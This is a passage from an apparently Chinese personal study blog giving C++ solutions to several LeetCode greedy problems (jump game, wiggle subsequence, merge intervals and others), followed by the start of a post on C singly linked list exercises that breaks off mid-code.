<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findContentChildren</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; g, vector&lt;<span class="keyword">int</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(g.<span class="built_in">begin</span>(),g.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123; <span class="comment">// 饼干</span></span><br><span class="line">            <span class="keyword">if</span>(index &lt; g.<span class="built_in">size</span>() &amp;&amp; g[index] &lt;= s[i])&#123; <span class="comment">// 胃口</span></span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="376-摆动序列"><a href="#376-摆动序列" class="headerlink" title="376 摆动序列"></a>376 摆动序列</h3><p>如果连续数字之间的差严格地在<strong>正数和负数之间交替</strong>，则数字序列称为 摆动序列 。【第一个差】（如果存在的话）可能是正数或负数。【仅有一个元素或者含两个不等元素的序列】也视作摆动序列。</p>
<pre><code>例如， [1, 7, 4, 9, 2, 5] 是一个 摆动序列 ，因为差值 (6, -3, 5, -7, 3) 是正负交替出现的。
相反，[1, 4, 7, 2, 5] 和 [1, 7, 4, 5, 5] 不是摆动序列，第一个序列是因为它的前两个差值都是正数，第二个序列是因为它的最后一个差值为零。
</code></pre>
<p>子序列 可以通过从原始序列中删除一些（也可以不删除）元素来获得，剩下的元素保持其原始顺序。</p>
<p>给你一个整数数组 nums ，返回 nums 中<strong>作为 摆动序列 的 最长子序列的长度</strong> 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    举例：[1,17,5,10,13,15,10,5,16,8]</span></span><br><span class="line"><span class="comment">      17    </span></span><br><span class="line"><span class="comment">                    16</span></span><br><span class="line"><span class="comment">              15</span></span><br><span class="line"><span class="comment">            13</span></span><br><span class="line"><span class="comment">          10    10</span></span><br><span class="line"><span class="comment">                        8</span></span><br><span class="line"><span class="comment">        5         5     </span></span><br><span class="line"><span class="comment">     1</span></span><br><span class="line"><span class="comment">     需要把单调递增的序列中间元素删掉，只保留最大和最小峰值的元素，个数即为 结果序列长度</span></span><br><span class="line"><span class="comment">     实际上：</span></span><br><span class="line"><span class="comment">        不必真的去删除 元素</span></span><br><span class="line"><span class="comment">    思路：</span></span><br><span class="line"><span class="comment">        遍历数组，遇到单调增或者单调减的元素，直接跳过；遇到峰值元素，使得res++。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//贪心</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">wiggleMaxLength</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[<span class="number">0</span>]!=nums[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left,right;</span><br><span class="line">        left = nums[<span class="number">1</span>]-nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> res = left==<span class="number">0</span>? <span class="number">1</span>:<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n;i++)&#123;</span><br><span class="line">            right = nums[i] - nums[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">if</span>((left&lt;=<span class="number">0</span>&amp;&amp;right&gt;<span class="number">0</span>) ||(left&gt;=<span class="number">0</span>&amp;&amp;right&lt;<span class="number">0</span>))&#123;<span class="comment">//一正一负，是峰值</span></span><br><span class="line">                <span class="comment">//cout &lt;&lt; nums[i]&lt;&lt;endl;</span></span><br><span class="line">                res++;</span><br><span class="line">                left = right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动态规划</span></span><br></pre></td></tr></table></figure>
<h3 id="55-跳跃游戏"><a href="#55-跳跃游戏" class="headerlink" title="55 跳跃游戏"></a>55 跳跃游戏</h3><p>给你一个非负整数数组 nums ，你最初位于数组的 第一个下标 。数组中的每个元素代表你在该位置可以跳跃的<strong>最大长度（多种选择）</strong>。<br>判断你是否能够到达最后一个下标，如果可以，返回 true ；否则，返回 false 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    自己写的，但是可以优化</span></span><br><span class="line"><span class="comment">    比如：循环中可以直接判断cover是否满足条件，满足了就return，不用进行完所有循环。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    误区：不用去想，究竟该跳几下</span></span><br><span class="line"><span class="comment">    最终结果只是判断是否能够跳到最后</span></span><br><span class="line"><span class="comment">    所以，关注 【覆盖范围】</span></span><br><span class="line"><span class="comment">    不断更新，最终只要覆盖范围包括最后一个元素即可</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canJump</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">0</span>]==<span class="number">0</span> &amp;&amp; n!=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">int</span> cover = <span class="number">0</span>;<span class="comment">//覆盖范围</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">//对于当前结点nums[i]来说，它能跳到的最大的点的坐标是i+nums[i]</span></span><br><span class="line">            <span class="keyword">if</span>(i+nums[i]&gt;cover &amp;&amp; cover&gt;=i)</span><br><span class="line">                cover = i+nums[i]; <span class="comment">//大了才更新</span></span><br><span class="line">                <span class="comment">//cout &lt;&lt; cover&lt;&lt; endl;  </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cover&gt;=n<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//优化后</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canJump</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">size</span>() == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 只有一个元素，就是能达到</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= cover; i++) &#123; <span class="comment">// 注意这里是小于等于cover</span></span><br><span class="line">            cover = <span class="built_in">max</span>(i + nums[i], cover);</span><br><span class="line">            <span class="keyword">if</span> (cover &gt;= nums.<span class="built_in">size</span>() - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 说明可以覆盖到终点了</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="45-跳跃游戏-II"><a href="#45-跳跃游戏-II" class="headerlink" title="45 跳跃游戏 II"></a>45 跳跃游戏 II</h3><p>给定一个长度为 n 的 0 索引整数数组 nums。初始位置为 nums[0]。<br>每个元素 nums[i] 表示从索引 i 向前跳转的最大长度。换句话说，如果你在 nums[i] 处，你可以跳转到任意 nums[i + j] 处:</p>
<pre><code>0 &lt;= j &lt;= nums[i] 
i + j &lt; n
</code></pre>
<p><strong>返回到达 nums[n - 1] 的最小跳跃次数</strong>。生成的测试用例可以到达 nums[n - 1]。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    思路：</span></span><br><span class="line"><span class="comment">        每一步，尽可能增加【覆盖范围】，一旦覆盖到了终点位置，则就是最小的步数。</span></span><br><span class="line"><span class="comment">    统计两个覆盖范围：【当前这一步的最大覆盖】和【下一步最大覆盖】</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/93eecc02fb5844059dfe21b31224dded.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">jump</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">0</span>]==<span class="number">0</span> &amp;&amp; n!=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//步数</span></span><br><span class="line">        <span class="keyword">int</span> now_cover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> next_cover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            next_cover = <span class="built_in">max</span>(next_cover,i+nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(i==now_cover)&#123;</span><br><span class="line">                res++;<span class="comment">//步数+1</span></span><br><span class="line">                now_cover = next_cover;</span><br><span class="line">                <span class="keyword">if</span>(now_cover&gt;=n<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 版本二</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">jump</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> curDistance = <span class="number">0</span>;    <span class="comment">// 当前覆盖的最远距离下标</span></span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;            <span class="comment">// 记录走的最大步数</span></span><br><span class="line">        <span class="keyword">int</span> nextDistance = <span class="number">0</span>;   <span class="comment">// 下一步覆盖的最远距离下标</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123; <span class="comment">// 注意这里是小于nums.size() - 1，这是关键所在</span></span><br><span class="line">            nextDistance = <span class="built_in">max</span>(nums[i] + i, nextDistance); <span class="comment">// 更新下一步覆盖的最远距离下标</span></span><br><span class="line">            <span class="keyword">if</span> (i == curDistance) &#123;                 <span class="comment">// 遇到当前覆盖的最远距离下标</span></span><br><span class="line">                curDistance = nextDistance;         <span class="comment">// 更新当前覆盖的最远距离下标</span></span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="763-划分字母区间"><a href="#763-划分字母区间" class="headerlink" title="763 划分字母区间"></a>763 划分字母区间</h3><p>给你一个字符串 s 。我们要把这个字符串<strong>划分为尽可能多的片段</strong>，同一字母最多出现在一个片段中。<br>注意，划分结果需要满足：将所有划分结果按顺序连接，得到的字符串仍然是 s 。<br><strong>返回一个表示每个字符串片段的长度的列表</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">partitionLabels</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            maap[s[i]] = <span class="built_in">max</span>(maap[s[i]],i);<span class="comment">//统计每个字符 最后出现的下标位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span> , cover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            cover = <span class="built_in">max</span>(cover,maap[s[i]]);<span class="comment">//字符的最远边界(这里是一直在更新不同字符的最远边界)cover = max(i,maap[s[i]]);</span></span><br><span class="line">            <span class="keyword">if</span>(i==cover)&#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(cover-start+<span class="number">1</span>);<span class="comment">//该划分 长度</span></span><br><span class="line">                start = i+<span class="number">1</span>;<span class="comment">//下一个划分 起始下标位置</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="56-合并区间"><a href="#56-合并区间" class="headerlink" title="56 合并区间"></a>56 合并区间</h3><p>以数组 intervals 表示若干个区间的集合，其中单个区间为 intervals[i] = [starti, endi] 。请你合并所有重叠的区间，并返回 一个不重叠的区间数组，该数组需恰好覆盖输入中的所有区间。<br><img src="https://img-blog.csdnimg.cn/f4e83d1097a8416db46ebc0ccb7c30ac.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">merge</span>(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; intervals) &#123;</span><br><span class="line">        <span class="keyword">if</span>(intervals.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(),intervals.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; range;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;intervals.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> left = intervals[i][<span class="number">0</span>];<span class="comment">//第i个范围的 左端点</span></span><br><span class="line">            <span class="keyword">int</span> right = intervals[i][<span class="number">1</span>];<span class="comment">//第i个范围的 右端点</span></span><br><span class="line">            <span class="keyword">if</span>(!range.<span class="built_in">size</span>() || left &gt; range.<span class="built_in">back</span>()[<span class="number">1</span>])</span><br><span class="line">            <span class="comment">//if(left &gt; range.back()[1] || !range.size())//不能这样写，判空必须在前</span></span><br><span class="line">                range.<span class="built_in">push_back</span>(&#123;left,right&#125;);<span class="comment">//本范围 左端点 &gt; range 中 最后范围的 右端点||range是空的时</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                range.<span class="built_in">back</span>()[<span class="number">1</span>] = <span class="built_in">max</span>(right, range.<span class="built_in">back</span>()[<span class="number">1</span>]);<span class="comment">//更新 范围为：当前范围 右端点和range中最后范围右端点 的最大值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> range;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="605-种花问题"><a href="#605-种花问题" class="headerlink" title="605 种花问题"></a>605 种花问题</h3><p>假设有一个很长的花坛，一部分地块种植了花，另一部分却没有。可是，花不能种植在相邻的地块上，它们会争夺水源，两者都会死去。</p>
<p>给你一个整数数组 flowerbed 表示花坛，由若干 0 和 1 组成，其中 0 表示没种植花，1 表示种植了花。另有一个数 n ，能否在不打破种植规则的情况下种入 n 朵花？能则返回 true ，不能则返回 false 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canPlaceFlowers</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; flowerbed, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = flowerbed.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(flowerbed[i]==<span class="number">0</span> &amp;&amp; (i==<span class="number">0</span>||flowerbed[i<span class="number">-1</span>]==<span class="number">0</span>) &amp;&amp; (i==len<span class="number">-1</span>||flowerbed[i+<span class="number">1</span>]==<span class="number">0</span>))&#123;</span><br><span class="line">                n--;</span><br><span class="line">                flowerbed[i]=<span class="number">1</span>;<span class="comment">//种花</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(n&lt;=<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>单链表、双链表练题</title>
    <url>/2021/10/05/%E5%8D%95%E9%93%BE%E8%A1%A8%E3%80%81%E5%8F%8C%E9%93%BE%E8%A1%A8%E7%BB%83%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p>
<h2 id="第三章-链式存储"><a href="#第三章-链式存储" class="headerlink" title="第三章  链式存储"></a>第三章  链式存储</h2><h3 id="1-设计一个算法，求一个单链表中的结点个数。"><a href="#1-设计一个算法，求一个单链表中的结点个数。" class="headerlink" title="1. 设计一个算法，求一个单链表中的结点个数。"></a>1. 设计一个算法，求一个单链表中的结点个数。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//计数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入结点值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>( x!= FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;链表是 空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    pt=creat();</span><br><span class="line">    print(pt);</span><br><span class="line">    sum = count(pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n该单链表中结点个数是：%d\n&quot;</span>,sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/03/g4NDwT3JfyEx7qI.png" alt="image-20211003114619188"></p>
<h3 id="2-设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。"><a href="#2-设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。" class="headerlink" title="2. 设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。"></a>2. 设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在值为 y 的结点前插入 值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">	node *q,*pre;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到值是%d的结点\n&quot;</span>,y);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    	q-&gt;info = x;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        pre-&gt;next = q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="function">node *<span class="title">creat</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入结点值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;		<span class="comment">//由于是 前插：所以输出的内容是与之前输入的顺序相反</span></span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span 